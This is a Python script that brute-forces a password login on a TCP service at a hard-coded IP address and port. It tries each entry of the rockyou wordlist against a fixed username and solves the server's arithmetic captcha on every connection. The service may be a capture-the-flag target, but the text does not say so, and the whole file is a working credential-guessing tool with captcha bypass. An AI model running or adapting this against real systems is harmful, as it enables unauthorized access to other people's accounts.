import socket
import time

host = "157.230.179.99" # IP address here
port = 1337 # Port here
wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file

def brute_force():
    username = "ejnorman84\n"  

    #Loop through every password until a match is found
    for password in open(wordlist, "r"):
        password += "\n"

        # Connect to the server 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))

        # Receive captcha from the server
        time.sleep(2)
        captcha_raw = s.recv(1024)
        captcha_clean = captcha_raw[17:len(captcha_raw)-5]
        captcha_arr = captcha_clean.split( )

        # Solve captcha
        captcha_ans = 0
        if len(captcha_arr) == 3:
            n1 = int(captcha_arr[0])
            op = captcha_arr[1]
            n2 = int(captcha_arr[2])
            captcha_ans = 0
            if "+" in op.decode():
                captcha_ans = n1 + n2
            elif "-" in op.decode():
                captcha_ans = n1 - n2
            elif "*" in op.decode():
                captcha_ans = n1 * n2
            elif "/" in op.decode():
                captcha_ans = n1 // n2
            else:
                captcha_ans = 0
        
        # Send captcha answer to server
        s.send((str(captcha_ans) + '\n').encode())

        #Receive username prompt from server and send username
        user_prompt = s.recv(1024)
        s.send(username.encode())

        #Receive password prompt and send password
        pass_prompt = s.recv(1024)
        s.send(password.encode())

        #Get response -> determine if attempt failed
        time.sleep(2)
        response = s.recv(1024).decode()
        if "Fail" in response:
            print(password[0:len(password)-2] + " failed...")
        else:
            print("SUCCESS: " + password)
            break

if __name__ == '__main__':
    brute_force()